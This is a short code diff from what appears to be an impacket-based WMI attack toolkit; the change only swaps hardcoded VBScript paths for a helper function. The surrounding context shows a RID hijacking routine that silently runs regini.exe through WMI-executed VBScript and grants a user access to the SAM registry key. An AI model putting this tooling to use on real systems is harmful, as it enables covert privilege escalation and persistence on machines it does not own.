@@ -9,6 +9,7 @@ import os
 from lib.methods.executeVBS import executeVBS_Toolkit
 from lib.modules.exec_command import EXEC_COMMAND
 from impacket.dcerpc.v5.dtypes import NULL
+from lib.helpers import get_vbs_path
 
 class RID_Hijack_Toolkit():
     def __init__(self, iWbemLevel1Login, dcom):
@@ -72,14 +73,14 @@ class RID_Hijack_Toolkit():
             ini_Content = ""
             for i in regini_Attr: ini_Content += i + "\r\n"
             ini_FileName = "windows-object-%s.ini"%str(uuid.uuid4())
-            with open('./lib/vbscripts/Exec-Command-Silent-UnderNT6-II.vbs') as f: vbs = f.read()
+            with open(get_vbs_path('Exec-Command-Silent-UnderNT6-II.vbs')) as f: vbs = f.read()
             vbs = vbs.replace("REPLACE_WITH_DEST", r'C:\windows\temp\%s'%ini_FileName).replace("REPLACE_WITH_DATA", base64.b64encode(ini_Content.encode('utf-8')).decode('utf-8')).replace("REPLACE_WITH_COMMAND", r'regini.exe C:\windows\temp\%s'%ini_FileName)
             tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
             exec_command.timer_For_UnderNT6()
             executer_vbs.remove_Event(tag)
         else:
             print("[+] Grant / Restrict user permissions to registry key via vbscript")
-            with open('./lib/vbscripts/GrantSamAccessPermission.vbs') as f: vbs = f.read()
+            with open(get_vbs_path('GrantSamAccessPermission.vbs')) as f: vbs = f.read()
             vbs = vbs.replace("REPLACE_WITH_USER", currentUsers)
             tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
             
